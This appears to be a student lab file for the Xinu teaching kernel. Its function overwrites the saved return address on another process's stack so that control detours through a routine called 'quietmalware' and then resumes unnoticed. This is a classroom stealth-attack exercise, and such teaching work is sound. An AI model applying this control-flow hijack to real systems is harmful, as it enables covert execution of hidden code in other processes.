/* attackerB.c - attackerB */

#include <xinu.h>

/*------------------------------------------------------------------------------
 * attackerB - modifies return address of process [getpid() - y] to quietmalware
 *             and makes sure that quietmalware() returns to the original EIP.
 *                      Created by cohen50 Lab4 - stealth attack
 *------------------------------------------------------------------------------
 */
void attackerB(int y) {
  pid32 attack_pid = getpid() - y;

  if (isbadpid(attack_pid)) {
    kprintf("bad pid - attackerB failed\n");
    return;
  }

  uint32 *stkptr = (uint32 *) proctab[attack_pid].prstkptr;

  /* Overwrite return address of attack_pid's stack to 'quietmalware'
   * skip over 10 places in the stack (all 8 registers pushed by 'pushal',
   * EFLAGS, and old EBP) to get to EIP.
   */

  stkptr += 10;
  uint32 original_ret_addr = *stkptr;
  *stkptr = (long)quietmalware;

  /* Inserts the original return address before the overwritten EIP, so that
   * quietmalware is essentially a detour before going to the original return
   * address that ctxsw() would have returned to.
   */
  
  *++stkptr = original_ret_addr;
}
